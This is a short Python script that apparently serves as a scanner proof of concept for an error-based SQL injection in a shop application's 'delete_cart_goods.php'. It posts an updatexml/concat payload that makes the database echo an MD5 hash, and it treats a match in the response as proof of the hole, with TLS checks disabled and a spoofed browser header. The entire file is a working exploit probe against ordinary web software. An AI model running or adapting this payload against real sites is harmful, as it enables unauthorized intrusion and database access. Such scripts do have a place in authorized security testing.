import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:lens]
	return result
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(40000, 44800)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"delete_cart_goods.php"
	body="id=0||(updatexml(1,concat(0x7e,(select%20md5("+str(r1)+")),0x7e),1))"
	headers={
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
	"Content-Type": "application/x-www-form-urlencoded"
	}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and substr(md5(str(r1).encode()).hexdigest(), 0, 31) in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
